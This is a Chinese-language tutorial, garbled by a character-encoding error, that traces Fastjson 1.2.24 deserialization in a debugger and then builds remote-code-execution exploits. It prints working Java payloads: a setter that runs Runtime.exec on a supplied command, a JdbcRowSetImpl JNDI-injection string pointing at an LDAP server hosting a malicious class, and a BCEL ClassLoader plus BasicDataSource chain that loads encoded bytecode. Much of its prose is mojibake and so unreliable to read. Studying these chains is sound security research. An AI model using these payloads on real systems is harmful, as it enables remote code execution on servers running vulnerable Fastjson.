å—æ”¶èµ·æ¥æ–¹ä¾¿åšä¸€ä¸ªå®è§‚çš„åˆ†æ å¦‚æœkeyçš„å€¼æ˜¯@typeï¼Œå³æˆ‘ä»¬å½“å‰çš„æƒ…å†µ èµ°è¿›ç¬¬ä¸€ä¸ªifä»£ç å— å±•å¼€åˆ†æå¯ä»¥å‘ç°æœ‰ä¸€è¡Œä»£ç ä¸­æœ‰loadClassï¼Œè·Ÿè¿›å»çœ‹çœ‹ é¦–å…ˆä¼šä»mappingsç¼“å­˜ä¸­æŸ¥æ‰¾classï¼Œæ‰¾åˆ°äº†å°±ç›´æ¥è¿”å›äº† æ²¡æ‰¾åˆ°çš„è¯å…ˆæ ¹æ®classNameè¿›è¡Œç±»ç‰¹æ®Šæ€§æ£€éªŒï¼Œå¦‚[å¼€å¤´å°±æ„å‘³ç€æ˜¯æ•°ç»„ç±»ï¼Œåˆ™è¿”å›Arrayå¯¹è±¡ï¼Œå¦‚æœæ˜¯Lå¼€å¤´;ç»“å°¾çš„ç±»æ•°ç»„å†™æ³•ï¼Œåˆ™å»æ‰é¦–ä½ï¼Œå†è°ƒç”¨loadClassï¼ˆforNameæ”¯æŒå¯¹æ•°ç»„çš„ç±»åŠ è½½loadClassä¸æ”¯æŒï¼‰ ä¹‹åå°±æ˜¯ç®€å•çš„è°ƒAppClassLoaderåœ¨æœ¬åœ°åŠ è½½ç±»ï¼ŒåŠ å…¥ç¼“å­˜ï¼Œè¿”å› ç»§ç»­å¾€ä¸‹è·Ÿï¼Œæ¥åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œ å‡ºç°äº†æˆ‘ä»¬ä¸€å¼€å§‹ä¼ å…¥çš„ç©ºçš„objectï¼Œ å®é™…ä¸Šæ¯ä¸€è½®å¾ªç¯åŠ è½½å®Œä¸€å¯¹keyå’Œvalueå°±ä¼šå¾€objectå†…å­˜å…¥ ç¬¬ä¸€è½®å°šæœªç»“æŸï¼Œæ²¡å­˜å…¥ä»»ä½•çš„ä¸œè¥¿æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æš‚æ—¶è·³è¿‡ ä¸‹æ–¹æ¥åˆ°æœ€å…³é”®çš„ä¸€éƒ¨åˆ† æ˜¯çœŸæ­£å¼€å§‹fastjsonååºåˆ—åŒ–æµç¨‹çš„ä¸€éƒ¨åˆ† ä»configä¸­è·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç´§æ¥ç€é€šè¿‡è¿™ä¸ªååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ– æˆ‘ä»¬è·Ÿè¿›å»çœ‹ååºåˆ—åŒ–å™¨æ˜¯æ€ä¹ˆè·å–åˆ°çš„ å…ˆä»ç¼“å­˜è¡¨ä¸­è·å–derializer psï¼šåœ¨ParseConfigçš„æ„é€ å‡½æ•°ä¸­å°†è®¸å¤šå†…ç½®ç±»putè¿›äº†ç¼“å­˜ä¸­ï¼Œä½†æ˜¯æ˜¾ç„¶æˆ‘ä»¬è¿™ä¸ªPersonç±»æ˜¯ä¸åœ¨çš„ æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°ï¼Œèµ°åˆ°ä¸‹é¢è¿™æ­¥æ—¶è·Ÿè¿›å» å¾€ä¸‹èµ°ï¼Œæ¥åˆ°ä¸€å¤„ä»£ç å—ï¼Œè‹¥åœ¨è¢«åºåˆ—åŒ–çš„ç±»ä¸Šé¢ä½¿ç”¨äº†@JSONTypeæ³¨è§£ï¼Œåˆ™ä¼šèµ°è¿›è¿™é‡Œé¢çš„è·å–ååºåˆ—åŒ–å™¨çš„é€»è¾‘è¿›è¡Œæ“ä½œ ç­‰äºè¯´æ˜¯ç”¨æˆ·è‡ªå®šä¹‰äº†ä¸€ä¸ªååºåˆ—åŒ–å™¨ ç»§ç»­å¾€ä¸‹èµ°åˆ°ä¸€å¤„é»‘åå•ï¼Œä»…ä»…æ˜¯ç¦äº†ä¸€ä¸ªThreadç±»è€Œå·² ç»§ç»­å¾€ä¸‹èµ° ä¹‹åä¾¿æ˜¯ä¸€å †çš„åˆ¤æ–­ï¼Œåˆ¤æ–­ç±»æ˜¯å¦ä¸ºæŸä¸ªåŒ…ä¸‹çš„ç„¶åå¯¹åº”è¿›è¡Œå¤„ç† ä¸€è·¯skipè¿‡å»ï¼Œæ¥åˆ°äº†åˆ›å»ºJavaBeanDeserializerï¼Œé¡¾åæ€ä¹‰ï¼Œåº”è¯¥æ˜¯ç”Ÿæˆä¸€ä¸ªJavaBeançš„ååºåˆ—åŒ–è§£æå™¨ æˆ‘ä»¬è·Ÿè¿›å»ï¼Œå¼€å¤´å®šä¹‰äº†asmEnableçš„å€¼é»˜è®¤ä¸ºtrue ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå‡ ç§æƒ…å†µä¸‹asmEnableä¼šå˜ä¸ºfalse çˆ¶ç±»æ ‡è¯†ç¬¦ä¸ºépublic æ³›å‹ç±»å‹å‚æ•°ä¸ä¸º0 ï¼ˆå¦‚UserImplT,Uçš„è¿”å›ç»“æœå°±æ˜¯2ï¼ŒUserImplTçš„è¿”å›ç»“æœå°±æ˜¯1ï¼‰ classæ˜¯å¦ä½¿ç”¨ExtClassLoaderç±»åŠ è½½å™¨ è¿™é‡Œç¨å¾®è¿›isExternalåˆ†æä¸€ä¸‹ whileå¾ªç¯ä¸€è½®è¿‡åï¼Œcurrentä¸ºASMClassLoaderçš„çˆ¶ç±»åŠ è½½å™¨ï¼Œå³AppClassLoader å‡å¦‚è¯´è¿™é‡Œçš„clazzçš„ç±»åŠ è½½å™¨classLoaderæ˜¯ExtClassLoaderï¼Œä¸ºæ‹“å±•åº“çš„ç±»ï¼Œåˆ™ä¼šè¿”å›true ä½†æ˜¯UserImplæ˜¾ç„¶æ˜¯åº”ç”¨ç¨‹åºçš„ç±»ï¼Œå…¶ç±»åŠ è½½å™¨ä¹Ÿåº”ä¸ºAppClassLoader å‡ºæ¥åç»§ç»­å¾€ä¸‹èµ°ï¼Œå‘ç°è¿˜æœ‰ä¸€éƒ¨åˆ†çš„èƒ½è®©asmClassLoaderä¸ºfalseçš„åœ°æ–¹ æ¯”è¾ƒç®€å•å°±ä¸ä¸€ä¸€åˆ—ä¸¾äº† ç»§ç»­å¾€ä¸‹èµ°ï¼Œæœ‰ä¸€è¡ŒJavaBeanInfo.build()æ–¹æ³•çš„è°ƒç”¨ï¼Œä¸»è¦å°±æ˜¯è¿”å›beançš„ä¸€äº›å±æ€§åŒ…æ‹¬å±æ€§åï¼Œæ–¹æ³•åï¼Œgetterï¼Œsetterç­‰ æˆ‘ä»¬è·Ÿè¿›å»ï¼Œé¦–å…ˆè·å–ç±»çš„å±æ€§ï¼Œpublicçš„æ–¹æ³•ï¼Œæ„é€ æ–¹æ³•ç­‰ 313è¡Œå¼€å§‹ï¼Œå°†forä»£ç å—æ”¶èµ·æ¥ï¼Œå®è§‚ä¸Šåˆ†ä¸ºä¸‰éƒ¨åˆ† ç¬¬ä¸€éƒ¨åˆ†ï¼Œéå†æ‰€æœ‰çš„publicæ–¹æ³•ï¼Œç›®çš„æ˜¯ä¸ºäº†è·å–ä½ çš„æ‰€æœ‰å­—æ®µ ç¬¬äºŒéƒ¨åˆ†ï¼Œéå†æ‰€æœ‰publicçš„å±æ€§ï¼Œä¸Šé¢æˆ‘ä»¬çš„Personç±»å±æ€§éƒ½æ˜¯privateçš„ï¼Œæ‰€ä»¥ç›¸å½“äºæ²¡æœ‰ ç¬¬ä¸‰éƒ¨åˆ†ï¼Œå†æ¬¡éå†æ‰€æœ‰çš„publicæ–¹æ³• ï¼ˆå®é™…ä¸Šç¬¬ä¸€æ¬¡éå†æ˜¯è°ƒæ‰€æœ‰çš„setterï¼Œç¬¬äºŒæ¬¡éå†æ˜¯è°ƒæ‰€æœ‰çš„getterï¼‰ okï¼Œæˆ‘ä»¬å…ˆè¿›å…¥ç¬¬ä¸€ä¸ªforå¾ªç¯ä¸­ å…ˆè¿›è¡Œåˆ¤æ–­ï¼šæ–¹æ³•åé•¿åº¦æ˜¯å¦å¤§äº4ï¼Œæ˜¯å¦æ˜¯é™æ€æ–¹æ³•ä»¥åŠè¿”å›å€¼æ˜¯å¦ä¸ºVoidæˆ–è€…Personç±»æœ¬èº« æœ€å¼€å§‹æ˜¯getNameï¼Œä¸æ»¡åˆ™æ¡ä»¶ï¼Œè·³è¿‡ ç›´åˆ°setNameæ–¹æ³•æ—¶ï¼Œè¿›å…¥ifä»å¥ å¾€ä¸‹èµ°è§„å®šæ–¹æ³•è¦ä»¥setå¼€å¤´æ‰èƒ½è¿›å…¥ifä»å¥ä¸­ ç»§ç»­å¾€ä¸‹èµ°ï¼Œå°†setterå¯¹åº”çš„propertyå…¨éƒ¨å­—ç¬¦è½¬å°å†™ï¼ŒNameå˜ä¸ºname å¾€åä¸€ç›´èµ°ï¼Œé€šè¿‡setteræ“ä½œéå†å®Œfieldè¿‡åï¼Œå°†ç»“æœä¿å­˜åˆ°fieldList è·Ÿè¿›FieldInfoï¼Œåº“åº“æ­¥è¿‡ï¼Œç›´åˆ°ä¸‹é¢è¿™ä¸ªæ¯”è¾ƒé‡è¦çš„å˜é‡getOnly è¿™é‡Œå…ˆä¸èµ˜è¿°äº†ï¼Œå…ˆåŸ‹ä¸€ä¸ªä¼ç¬” addæ–¹æ³•å°±æ˜¯å°†ç»“æœæ”¾åˆ°fieldListä¸­ setteréƒ½éå†å®Œä¹‹åï¼Œå¼€å§‹éå†æ‰€æœ‰çš„publicå­—æ®µ å¯¹fieldçš„éå†è¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œä¸åšè¯¦ç»†æè¿°äº† å¾€ä¸‹åˆ°getterçš„éå†ï¼Œå‰é¢çš„ifåˆ¤æ–­å’Œsetteréå†æ˜¯ç›¸ä¼¼çš„ï¼Œç›´åˆ°è¿™ä¸€éƒ¨åˆ†ifåˆ¤æ–­ä»£ç  (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()) åªæœ‰å½“getterçš„è¿”å›å€¼æ»¡è¶³è¿™ä¸ªifä¸­çš„Collectionã€Mapç­‰ï¼Œæ‰èƒ½è¿›å…¥åˆ°ä»£ç ä¸­èµ°åˆ°æœ€åçš„add ä¹Ÿå°±æ˜¯è¯´æ‰èƒ½è¢«å½“åšä¸€ä¸ªpropertyè¢«åŠ å…¥åˆ°fieldListä¸­ åŒæ—¶è¿˜éœ€è¦æ»¡è¶³fieldListä¸­ä¸åŒ…å«è¿™ä¸ªå­—æ®µï¼Œä¹Ÿå°±æ˜¯è¯´è¦æ˜¯å‰é¢setteræ–¹æ³•å°†æŸä¸ªå­—æ®µåŠ å…¥äº†fieldListä¸­åï¼Œå°±ä¸ä¼šå†é€šè¿‡getteræ–¹æ³•åŠ å…¥äº† åœ¨è¿™é‡Œæˆ‘ä»¬è‚¯å®šéƒ½æ˜¯ä¸æ»¡è¶³çš„ï¼Œæ‰€ä»¥éƒ½ä¼šè·³è¿‡ï¼Œèµ°åˆ°æœ€åä¸€è¡Œreturnçš„ä»£ç å¤„ï¼Œå°†å‰é¢éå†çš„å­—æ®µè¿˜æœ‰æ–¹æ³•ä¹‹ç±»çš„å°è£…èµ·æ¥ èµ°å‡ºæ¥åï¼Œèƒ½åœ¨beanInfoä¸­çœ‹åˆ°åˆšåˆšå°è£…å¥½çš„å­—æ®µ åœ¨ä¸‹é¢ä¸€éƒ¨åˆ†ä»£ç ä¸­è¿˜æœ‰å¥½å‡ ç§æ–¹æ³•å¯ä»¥ä½¿å¾—asmEnableçš„å€¼ä¸ºfalse ä¸Šé¢å¤šæ¬¡æåˆ°asmEnbleè¿™ä¸ªå¼€å…³ï¼Œé‚£ä¹ˆå®ƒçš„ä½œç”¨ç©¶ç«Ÿæ˜¯ä»€ä¹ˆå‘¢ å¾€ä¸‹èµ°ä¹‹åï¼Œç´§æ¥ç€å°±èµ°åˆ°ä¸€ä¸ªifåˆ¤æ–­ å¦‚æœasmEnableæ˜¯é»˜è®¤çš„trueçš„è¯ï¼Œé‚£ä¹ˆä¸ä¼šèµ°åˆ°new JavaBeanDeserializerï¼Œè€Œæ˜¯ä¼šè¿”å›ä¸€ä¸ªasmFactoryçš„åˆ›å»ºååºåˆ—åŒ–å™¨çš„æ–¹æ³• è¿”å›åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å™¨æ˜¯æˆåŠŸåˆ›å»ºäº†å‡ºæ¥ ä½†æ˜¯è¿™æ ·çš„ç±»æœ‰ä»€ä¹ˆä¸å¥½çš„åœ°æ–¹å‘¢ï¼Œå°±æ˜¯ä¸´æ—¶åˆ›å»ºçš„ç±»åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°æ ¹æœ¬ä¸æ¸…æ¥šè¿™ä¸ªè¿‡ç¨‹åšäº†ä»€ä¹ˆï¼Œè°ƒç”¨æ ˆä¸Šè™½ç„¶æœ‰ï¼Œä½†æ˜¯ç‚¹å‡»å¹¶æ²¡æœ‰ä»»ä½•çš„ååº” å› æ­¤å¦‚æœæƒ³è¦è°ƒè¯•æˆ‘ä»¬åªèƒ½è®©asmEnableä¸ºfalseï¼Œç„¶ånew JavaBeanDeserializeræ¥åˆ›å»ºä¸€ä¸ªååºåˆ—åŒ–å™¨ åœ¨ä¸Šé¢çš„ä¼ç¬”ä¸­ä¸­ï¼Œå­˜åœ¨é€šè¿‡åˆ¤æ–­å­—æ®µæ˜¯å¦getOnlyæ¥å…³é—­asmEnable ä¹Ÿå°±æ˜¯åªè¦å­—æ®µgetOnlyä¸ºtrueä½¿å¾—asmEnableä¸ºfalseï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸ä¼šåƒåˆšæ‰é‚£æ ·è¿”å›ä¸€ä¸ªasmFactoryçš„åˆ›å»ºååºåˆ—åŒ–å™¨çš„æ–¹æ³•ï¼Œè€Œæ˜¯èµ°åˆ°new JavaBeanDeserializerï¼Œè¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥å¥½å¥½åœ°è¿›è¡Œè°ƒè¯•äº† é‚£ä¹ˆgetOnlyçš„å€¼åªæœ‰åœ¨ä¸‹é¢è¿™ä¸€å¤„å¯ä»¥æ”¹ FieldInfoä¸­çš„getOnlyå¤„ï¼Œåˆ¤æ–­æ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¸º1ï¼Œä¸æ˜¯çš„è¯getOnlyå°±ä¸ºtrue ç„¶ååœ¨å‰é¢çš„setteræ–¹æ³•çš„å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¦æ˜¯å‚æ•°å€¼ä¸ä¸º1çš„è¯ä¼šç›´æ¥è·³å‡ºå¾ªç¯ï¼Œéƒ½èµ°ä¸åˆ°add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));å¤„ï¼Œè‡ªç„¶ä¹Ÿå°±ä¿®æ”¹ä¸äº†getOnlyçš„å€¼ å› æ­¤æˆ‘ä»¬åªèƒ½å¤Ÿé€šè¿‡getteræ–¹æ³•æ¥è¿›è¡Œä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¸€ä¸ªå¯¹è±¡ï¼Œä¸å…¶å¯¹åº”çš„åªæœ‰ä¸€ä¸ªgetterï¼ˆå¦‚æœæœ‰setterä¼šä¼˜å…ˆè°ƒç”¨setterè€Œä¸ä¼šè°ƒç”¨getterï¼‰ ä½†æ˜¯ä¸Šé¢åˆ†æè¿‡äº†è°ƒç”¨è¿™ä¸ªgetteréœ€è¦getterçš„è¿”å›å€¼æ»¡è¶³é‚£å‡ ç§ç±»å‹ï¼ˆCollectionã€Mapç­‰ï¼‰ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼ŒPersonç±»ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š package org.example;import java.util.Map;public class Person private int age; private String name; private Map map; public Person() System.out.println(Person constructor); public int getAge() System.out.println(getAge); return age; public void setAge(int age) System.out.println(setAge); this.age = age; public String getName() System.out.println(getName); return name; public void setName(String name) System.out.println(setName); this.name = name; public Map getMap() System.out.println(getMap); return map; ä¿®æ”¹å®Œåæˆ‘ä»¬é‡æ–°è°ƒè¯•ä¸€ä¸‹ æˆåŠŸä¿®æ”¹ æˆåŠŸå…³æ‰å¼€å…³ï¼Œäºæ˜¯æˆ‘ä»¬è¿”å›çš„å°±æ˜¯ä¸€ä¸ªJavaBeanDeserializer äºæ˜¯æˆ‘ä»¬ä¹Ÿå°±èƒ½æ­£å¸¸åœ°è¿›è¡Œè°ƒè¯•äº†ï¼ˆä¸Šé¢å¿™æ´»è¿™ä¹ˆå¤šå°±æ˜¯ä¸ºäº†èƒ½æ­£å¸¸åœ°è°ƒè¯•ï¼‰ è¿™ä¸€æ¬¡çš„derializerå’Œä¸Šæ¬¡çš„ç›¸æ¯”å¤šäº†ä¸€ä¸ªmapå­—æ®µ ç„¶åè·å–åˆ°äº†ä¹‹åæˆ‘ä»¬å°±è°ƒç”¨å®ƒçš„ååºåˆ—åŒ–æ–¹æ³• ä¸€ç›´è·Ÿè¿›deseralizeæ–¹æ³• 358è¡Œå¼€å§‹å¯¹æ¯ä¸ªå­—æ®µéå†è¿›è¡Œå®ä¾‹åŒ–èµ‹å€¼æ“ä½œ 580è¡Œï¼Œæ­¥å…¥createInstanceæ–¹æ³• è¯¥å‡½æ•°å…ˆè¿›è¡Œä¸€ä¸ªåˆ¤æ–­æ˜¯å¦æ˜¯æ¥å£ï¼Œæ˜¯çš„è¯å°±ç”Ÿæˆä¸€ä¸ªä»£ç†ï¼›ä¸æ˜¯çš„è¯å°±è°ƒç”¨å…¶è‡ªå·±çš„é»˜è®¤æ„é€ å‡½æ•°æ¥è¿›è¡Œå®ä¾‹åŒ–ï¼Œå†return objectå›å» ç»§ç»­å¾€ä¸‹èµ°ï¼Œèµ°åˆ°setValue()å¤„ï¼Œå¼€å§‹ç»™å­—æ®µèµ‹å€¼äº†ï¼Œè¿™æ˜¯æœ€é‡è¦çš„ä¸€éƒ¨åˆ† ä¸€è·¯å¾€ä¸‹èµ°ï¼Œæ¥åˆ°äº†ä¸€å¤„åå°„ï¼Œè°ƒç”¨setteræ¥å®Œæˆèµ‹å€¼ æ­¥è¿‡ï¼Œæ§åˆ¶å°è¾“å‡ºsetName ageçš„èµ‹å€¼åŒç†ï¼Œ è‡³æ­¤ä¸€æ•´ä¸ªååºåˆ—åŒ–çš„æµç¨‹ç»“æŸ å›åˆ°å‰é¢ï¼ŒæˆåŠŸæ‹¿åˆ°äº†Personå¯¹è±¡ åœ¨ç»§ç»­å¾€ä¸‹èµ°çš„è¿‡ç¨‹æ¥åˆ°toJSON()ï¼Œä¼šè°ƒç”¨getter è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯å‰é¢ä¸€æ­¥æ˜¯æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºäº†å¯¹è±¡ï¼Œç„¶åè¿™ä¸€æ­¥æ˜¯æŠŠå¯¹è±¡è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸² æˆ‘ä»¬è·Ÿè¿›å»ï¼Œå¾€ä¸‹èµ°åˆ°è¿™ä¸€æ­¥ è¯¥è¡Œä»£ç ä¼šè·å–åˆ°ä¸€ä¸ªä¸æŒ‡å®šç±»clazzå…³è”çš„å¯¹è±¡åºåˆ—åŒ–å™¨ å¾€ä¸‹èµ°åˆ°è¿™ä¸€æ­¥ï¼Œè·Ÿè¿›å» ä¼šåœ¨è¿™é‡Œè·å–å€¼ï¼Œè·Ÿè¿›getPropertyValueæ–¹æ³•é‡Œ ç„¶åæˆ‘ä»¬å†è·Ÿè¿›getæ–¹æ³• åœ¨è¿™é‡Œé¢ä¼šåå°„è°ƒç”¨getteræ–¹æ³• åˆ°è¿™é‡ŒåŸºæœ¬çš„æµç¨‹å·®ä¸å¤šå°±ç»“æŸ ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥å¾—çŸ¥åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨setteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦æœ‰ä¸€ä¸ªç±»ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªsetteræ–¹æ³•ä¸­æœ‰å±é™©å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®è¡Œæ”»å‡» ä¿®æ”¹ä¸€ä¸‹Personç±» package org.example;import java.io.IOException;import java.util.Map;public class Person private int age; private String name; private Map map; public Person() System.out.println(Person constructor); public int getAge() System.out.println(getAge); return age; public void setAge(int age) System.out.println(setAge); this.age = age; public String getName() System.out.println(getName); return name; public void setName(String name) System.out.println(setName); this.name = name; public Map getMap() System.out.println(getMap); return map; public void setCmd(String cmd) throws IOException Runtime.getRuntime().exec(cmd); æµ‹è¯•ä»£ç  package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser public static void main(String[] args) throws Exception String s = \\@type\\ : \\org.example.Person\\, \\age\\ : 18, ame\\ : \\Sherlock\\, \\cmd\\ : \\calc\\; JSONObject jsonObject = JSON.parseObject(s); System.out.println(jsonObject); æ‰§è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ 1.2.24åˆ©ç”¨JdbcRowSetImplåœ¨connect()æ–¹æ³•ä¸‹é¢å­˜åœ¨æ˜æ˜¾çš„jndiæ³¨å…¥ lookupçš„å‚æ•°æ˜¯é€šè¿‡getteræ¥è·å–çš„ æˆ‘ä»¬è¦æ€ä¹ˆåˆ¤æ–­å˜é‡å¯æ§ï¼Œå°±æ˜¯å˜é‡è¦æœ‰å¯¹åº”çš„setteræˆ–è€…æ˜¯publicæˆ–è€…æ˜¯æ»¡è¶³æ¡ä»¶çš„getterï¼ˆå…·ä½“å¯ä»¥å»çœ‹JavaBeanInfo.javaæ–‡ä»¶ä¸­çš„å¯¹åº”ä»£ç ï¼‰ å› æ­¤this.getDataSourceName()å˜é‡å¯æ§ï¼ˆç”±jndiç›¸å…³çŸ¥è¯†å¯çŸ¥è¿™æ˜¯ä¸€ä¸ªåœ°å€ï¼‰ï¼Œå› ä¸ºç‚¹è¿›å»ä¸‹é¢å°±æ˜¯å¯¹åº”çš„setteræ–¹æ³• æ¥ä¸‹æ¥å°±ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œæ‰¾connectæ–¹æ³•æ˜¯å¦åœ¨getteræˆ–è€…setterä¸­ ç”±ä¸Šé¢é€»è¾‘è°ƒè¯•ä¸­çš„åˆ†æï¼Œæƒ³è°ƒç”¨getteræœ‰ä¸¤ç§é€”å¾„ï¼š 1ã€è¿”å›å€¼è§„å®šçš„é‚£äº›ä¸ªgetteræ‰èƒ½è¢«addåˆ°fieldListä¸­åç»­è¢«è°ƒç”¨ï¼Œä½†æ˜¯è¿™é‡Œçš„è¿”å›å€¼DatabaseMetaDataæ˜¾ç„¶ä¸ç¬¦åˆè¦æ±‚ 2ã€éœ€è¦èƒ½èµ°åˆ°toJSONï¼Œè€Œèµ°åˆ°toJSONéœ€è¦ä¿è¯åˆ°ä½ è¿™éœ€è¦çš„getterä¹‹å‰çš„æ‰€æœ‰getteræµç¨‹ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œèƒ½æ­£å¸¸invoke ä½†æ˜¯è¿™é‡Œç¬¬ä¸€ä¸ªæ–¹æ³•å°±ggäº†æ²¡invokeæˆåŠŸ å› æ­¤åªèƒ½èµ°setterï¼Œä¹Ÿå°±æ˜¯setAutoCommitæ–¹æ³• å…ˆå¼€å¯LDAPæœåŠ¡å™¨å¹¶åœ¨7777ç«¯å£æŒ‚è½½å¥½æ¶æ„ç±» payloadå¦‚ä¸‹ï¼š package org.example;import com.alibaba.fastjson.JSON;public class FastJsonJdbcRowSetImpl public static void main(String[] args) throws Exception String s = \\@type\\:\\com.sun.rowset.JdbcRowSetImpl\\,\\DataSourceName\\:\\ldap://localhost:10389/cn=test,dc=example,dc=com\\,\\AutoCommit\\:false; JSON.parseObject(s); æµ‹è¯•ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ è¿™æ¡é“¾ç”±äºæ˜¯åˆ©ç”¨äº†jndiæ³¨å…¥ï¼Œæ‰€ä»¥ä¼šå—åˆ°ç‰ˆæœ¬é™åˆ¶(jdk8u191)ã€ä¾èµ–é™åˆ¶ï¼ŒåŒæ—¶è¿˜éœ€è¦å‡ºç½‘æ‰å¯ä»¥ bcel.ClassLoader(ä¸å‡ºç½‘) æˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜¯è¯¥ç±»ä¸­çš„loadClassæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸­ä¸»è¦åˆ©ç”¨éƒ¨åˆ†å¦‚ä¸‹ ç±»åæ»¡è¶³ä¸€å®šæ¡ä»¶åä¼šæ‰§è¡ŒcreateClassæ–¹æ³•ç”Ÿæˆç±»ï¼Œç„¶åå†ç”¨defineClassæ–¹æ³•è¿›è¡Œå­—èŠ‚ç åŠ è½½ æˆ‘ä»¬å…ˆå•çº¯åˆ©ç”¨è¯¥æ–¹æ³•ä¸æ¶‰åŠåˆ°fastjsonæ¥æµ‹è¯•ä¸€ä¸‹ package org.example;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.util.ClassLoader;import java.nio.file.Files;import java.nio.file.Paths;public class FastJsonBcel public static void main(String[] args) throws Exception ClassLoader classLoader = new ClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\T.class)); String str = Utility.encode(bytes,true); str = $$BCEL$$ + str; classLoader.loadClass(str).newInstance(); è¿è¡Œåä¼šæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œè‡³äºä¸ºä»€ä¹ˆä»£ç ä¸­æœ‰ä¸€è¡Œencodeå‘¢ï¼Œè¿™æ˜¯å› ä¸ºä¸Šé¢çš„createClassæ–¹æ³•ä¸­ä¼šæœ‰ä¸€ä¸ªdecodeæ–¹æ³•ï¼Œæ‰€ä»¥ç›¸åº”çš„æˆ‘ä»¬å°±éœ€è¦æ¥ä¸ªencodeæ–¹æ³•å–½ okï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æƒ³åŠæ³•è°ƒç”¨åˆ°loadClassæ–¹æ³•äº† å¼•å…¥ä¾èµ– dependency groupIdorg.apache.tomcat/groupId artifactIdtomcat-dbcp/artifactId version9.0.20/version/dependency æˆ‘ä»¬æ‰€æ‰¾çš„ç±»ä¸ºBasicDataSourceï¼Œæ‰€éœ€è¦çš„æ–¹æ³•ä¸ºcreateConnectionFactory() æˆ‘ä»¬å¯ä»¥çŸ¥é“è¯¥æ–¹æ³•ä¸­é€šè¿‡forNameå‡½æ•°æ¥åŠ è½½ç±»ï¼Œç°åœ¨æˆ‘ä»¬å°±è¦çœ‹driverClassNameå’ŒdriverClassLoaderæœ‰æ²¡æœ‰å¯¹åº”çš„setteræ–¹æ³• ï¼ˆforNameæ–¹æ³•çš„åº•å±‚å°±æ˜¯è°ƒç”¨loadClassæ–¹æ³•ï¼‰ ä¸¤ä¸ªå˜é‡éƒ½å¯æ§ ç°åœ¨æˆ‘ä»¬å†ä»createConnectionFactory()æ–¹æ³•å‘ä¸ŠæŸ¥æ‰¾ï¼Œçœ‹çœ‹ä¼šä¸ä¼šåœ¨setteræˆ–getterä¸­ èµ°åˆ°createDataSource()ï¼Œå†å‘ä¸ŠæŸ¥æ‰¾èµ°åˆ°äº†getConnection()ï¼ˆè¿˜åœ¨åŒä¸€ä¸ªæ–‡ä»¶å†…ï¼‰ å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªgetteræ–¹æ³•ï¼Œè¿”å›ç±»å‹ä¸æ»¡è¶³é‚£å‡ ç§ï¼Œæ‰€ä»¥å°±æ˜¯åœ¨toJsonæ–¹æ³•ä¸­è°ƒç”¨çš„getteræ–¹æ³• æ­£å‘æ¼æ´ä»£ç ï¼š ClassLoader classLoader = new ClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(D:\\\\tmp\\\\Test.class)); String str = Utility.encode(bytes,true);// System.out.println(str); str = $$BCEL$$ + str; BasicDataSource basicDataSource = new BasicDataSource(); basicDataSource.setDriverClassName(str); basicDataSource.setDriverClassLoader(classLoader); basicDataSource.getConnection(); éªŒè¯æ—¶å¯ä»¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadå¦‚ä¸‹ï¼š package org.example;import com.alibaba.fastjson.JSON;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.util.ClassLoader;import java.nio.file.Files;import java.nio.file.Paths;public class FastJsonBcel public static void main(String[] args) throws Exception ClassLoader classLoader = new ClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\T.class)); String str = Utility.encode(bytes,true); str = $$BCEL$$ + str;// classLoader.loadClass(str).newInstance(); String s = \\@type\\:\\org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\,\\driverClassLoader\\:\\@type\\:\\com.sun.org.apache.bcel.internal.util.ClassLoader\\,\\driverClassName\\:\\+str+\\; JSON.parseObject(s); æµ‹è¯•ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ TemplatesImplå®ç”¨ä»·å€¼ä¸é«˜ a: @type: 